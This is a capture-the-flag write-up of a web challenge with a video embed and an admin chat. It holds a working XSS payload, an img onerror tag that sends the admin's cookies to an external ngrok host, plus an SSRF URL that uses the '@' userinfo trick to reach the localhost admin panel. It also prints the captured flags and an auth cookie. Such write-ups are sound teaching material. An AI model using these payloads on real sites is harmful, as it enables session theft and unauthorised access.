# Notes

This challenge provides a URL to visit. Looking at the page, it has a video that is playing and a chat window to communicate with the admin.

Two things I notice off the bat:
* There embedded video is loaded from a path which takes a URL as a parameter for the file to display. This might be susceptible to a path vulnerability like `../../../../etc/passwd` or similar.
* The chat window displays any text I enter to it, so it might be vulnerable to reflected XSS (although that would require reading in the input from the URL itself, so it's unlikely).

Trying some basic stuff with the video embed path, it appears to require a URL which has `http://cwo-xss.web.ctfcompetition.com`. Not sure if this is vulnerable or not. Maybe I can get it to load a non-video file, or maybe the URL-checking code is vulnerable so I can provide a different path which happens to include the valid domain name in a way that makes it ignored (and only the path part is used).

There are also two javascript files to check out:
* `static/js/main.js`
* `static/js/admin.js`

The `admin.js` file appears to be empty, and I can't get content to load by passing it to the `/watch` path (the video embed thing). However, `main.js` does some basic string concatenation to build HTML for insertion into the page, which is usually the sign of an XSS vulnerability.

A basic attempt at XSS triggered a "HACKER ALERT!" message from the chat system's POST response, so there's some input checking server-side. It might be something that can be subverted, however. The `script` tag appears to trigger the filter, but other HTML tags do not.

(the next day)

I thought I had found an XSS attack vector, with a similar mechanic to the earlier XSS challenge (gov-xss). The admin chat panel has some layer of XSS protection, but going through the [OWASP XSS evasion cheat sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) I found that the first example under "Non-alpha non-digit XSS" passed through the filter.

Unfortunately, after crafting a `script` tag attack which loaded a JS to redirect the browser w/ cookie data in the query parameters, it looks like the exploit JS is not being executed by the admin's browser. There definitely /is/ an admin browser, however because if I do a (non-exploit) image tag, both my browser and the admin's load it.

Maybe it's actually a result of my client redirecing away that prevents the server from also executing the JS? That seems... unlikely. Nope, I tried just doing `fetch` instead of `document.location` and it still didn't make the request.

Doing some more research, there's a possible XSS when you only have access to get a target browser to load an image file. This is possible because the GIF header is entirely ASCII through the width field, so you can craft a file which is both a valid GIF and valid JS, using comment characters in the width field.

I tried that and it didn't seem to trigger any JS to run (either from an `img` tag or a `script` tag). However, I noticed that when I had the previously-working `script` tag attack load a source that was not a `.js` file (the GIF), the admin machine *did* request that file.

Perhaps I can just send it some JS directly and rename the file, or change the `Content-Type` response header and trick it into loading it.

False alarm, I guess. I wasn't able to get it to happen again so maybe I was mistaking the request log entry with one from when I tried an `img` tag.

Okay, I made this harder than it needed to be... I had verified that `onload` and `onmouseover` event attributes were filtered out, and then assumed other ones were as well. Never assume :)

It turns out the `onerror` event was not filtered out, so I was able to craft a pretty straight-forward `img` tag-based XSS attack:
```
<img src="x:x" onerror="document.location='http://xxxxxxxx.ngrok.io/exploit?cookie='+encodeURI(document.cookie);" />
```

This caused the admin computer to request the provided URL and include their cookies, which had the flag:
```
CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}
```

There was also an `auth` cookie, which I added to my own browser:
```
TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz
```

When requesting the root path with this cookie, the page included a link to the `/admin` path. I was able to access the admin control panel. After poking around a bit, I was not able to see anything obvious to attack. I might need to come back to this later.

... weeks later ...

I was watching Gynvael's livestream where he went through all of the Beginners Quest flags. When he got to this challenge he decided to go for the additional flag, and mentioned possibly using SSRF on the admin controls page (https://cwo-xss.web.ctfcompetition.com/admin/controls). I tried the most obvious thing first, which was to use the video embed thing mentioned earlier: https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com/admin/controls .

Unfortunately that did not work because the admin controls page is coded to reject any requests not coming from 127.0.0.1 (from the server's viewpoint). Thinking about it some more, I figured maybe there was something that could be circumvented in the URL-checking code for the video embed endpoint.

To reiterate from above... if I try the most direct route: https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://127.0.0.1/admin/controls the `/watch` endpoint will fail because it only accepts a `livestream` paramter for URLs to `http://cwo-xss.web.ctfcompetition.com`. I figured, maybe the way they're checking that is not sufficient, so I did a quick test: https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.combo

This returned a Squid error page from a failed DNS to the domain `cwo-xss.web.ctfcompetition.combo`. Since that's not a valid TLD, the DNS lookup will very likely fail, and it did. The important thing, however, is that I got a different error from the URL-checking error. This means that the server's code to validate the `livestream` parameter is something like a regex for `/^https?://cwo-xss.web.ctfcompetition.com/` to verify that the URL begins with that literal string.

However the tricky thing about URL parsing is that the bit that follows the scheme and `://` separator, is not necesssarily the host address. In the full URL format specification, what can optionally precede the host address, is the username (and optionally password) followed by an `@` separator. This means that I could craft a URL which starts with the string being checked for, but which actually uses `127.0.0.1` as the host address, and since the server itself is making the request, that host IP address will resolve to the same web server and it will actually make the request.

In the end, the URL I went with was: https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com@127.0.0.1/admin/controls

This caused the `/watch` endpoint to return the admin controls page, which had the second flag:
```
CTF{WhatIsThisCookieFriendSpaceBookPlusAllAccessRedPremiumThingLooksYummy}
```
